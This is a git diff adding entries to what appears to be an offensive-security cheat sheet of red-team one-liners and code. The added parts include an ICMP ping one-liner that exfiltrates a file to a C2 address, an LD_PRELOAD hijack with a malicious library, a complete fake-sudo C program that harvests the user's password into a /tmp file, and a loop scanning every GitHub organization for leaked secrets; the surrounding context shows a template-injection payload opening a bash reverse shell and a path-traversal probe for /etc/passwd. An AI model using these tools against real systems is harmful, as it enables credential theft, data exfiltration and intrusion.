@@ -49,6 +49,12 @@ function sudo() {
     $realsudo "${@:1}"
 ```
 
+## ICMP Tunneling One Liner:
+
+```
+xxd -p -c 4 /path/exfil_file | while read line; do ping -c 1 -p $line <C2 IP>; done
+```
+
 ## One Liner to Add Persistence on a Box via Sudoers File:
 
 ```
@@ -216,6 +222,14 @@ testssl.sh --starttls imap <imaphost>.<tld>:143
 
 ```
 cat hosts | httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd" -mr "root:x" -silent
+```
+
+## LD_PRELOAD Hijacking:
+
+If you set LD_PRELOAD to the path of a shared object, that file will be loaded before any other library (including the C runtime, libc.so)
+
+```
+LD_PRELOAD=/path/to/my/malicious.so /bin/ls
 ```
 
 ## Bash Keylogger:
@@ -870,6 +884,22 @@ Decoded:
 ${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}
 ```
 
+## POP Syntax:
+
+```
+POP Commands:
+  USER rosesecurity           Log in as "rosesecurity"
+  PASS password      Substitue "password" for your actual password
+  STAT               List number of messages, total mailbox size
+  LIST               List messages and sizes
+  RETR n             Show message n
+  DELE n             Mark message n for deletion
+  RSET               Undo any changes
+  QUIT               Logout (expunges messages if no RSET)
+  TOP msg n          Show first n lines of message number msg
+  CAPA               Get capabilities
+```
+
  ## SSH Dynamic Port Forwarding:
  
  Forwards one local port to multiple remote hosts; it is useful for accessing multiple systems.
@@ -1120,4 +1150,70 @@ if (ip.proto == TCP) {
       }
    }
 }
+```
+
+## Fake Sudo Program to Harvest Credentials:
+
+Mimics legitimate Sudo binary to capture credentials and output to ```/tmp``` directory file.
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <termios.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <pwd.h>
+
+
+int main( int argc, char *argv[] )
+{
+    if( argc == 2 ) {
+        struct termios oflags, nflags;
+            char password[64];
+            char Command[255];
+            char *lgn;
+            lgn = getlogin();
+            struct passwd *pw;
+            FILE *fp;
+            /* disabling echo */
+            tcgetattr(fileno(stdin), &oflags);
+            nflags = oflags;
+            nflags.c_lflag &= ~ECHO;
+            nflags.c_lflag |= ECHONL;
+
+            if (tcsetattr(fileno(stdin), TCSANOW, &nflags) != 0) {
+                perror("tcsetattr");
+                return EXIT_FAILURE;
+            }
+
+            printf("Password: ");
+            fgets(password, sizeof(password), stdin);
+            password[strlen(password) - 1] = 0;
+            sprintf(Command, "sudo -S <<< %s command %s", password, argv[1]);
+            system(Command);
+            fp = fopen("/tmp/tmp-mount-sU90gRA6", "w+");
+            fprintf(fp, "User: %s\tPassword: %s", lgn, password); exit(1);
+            fclose(fp);
+            /* restore terminal */
+            if (tcsetattr(fileno(stdin), TCSANOW, &oflags) != 0) {
+                perror("tcsetattr");
+                return EXIT_FAILURE;
+            }
+
+    return 0;
+   }
+   else {
+    printf("usage: sudo -h | -K | -k | -V\nusage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]\nusage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]\nusage: sudo [-AbEHknPS] [-C num] [-D directory] [-g group] [-h host] [-p prompt] [-R directory] [-T timeout] [-u user]\n\t[VAR=value] [-i|-s] [<command>]\nusage: sudo -e [-AknS] [-C num] [-D directory] [-g group] [-h host] [-p prompt] [-R directory] [-T timeout] [-u user]\n\tfile ...\n");
+   }
+	return 0;
+}
+```
+
+## TruffleHog GitHub Organizations:
+
+Enumerate GitHub organizations for secrets and credentials
+
+```console
+root@RoseSecurity# orgs=$(curl -s https://api.github.com/organizations | jq -r '.[] | .name'); for i in $orgs; do trufflehog github --org=$i; done
 ```
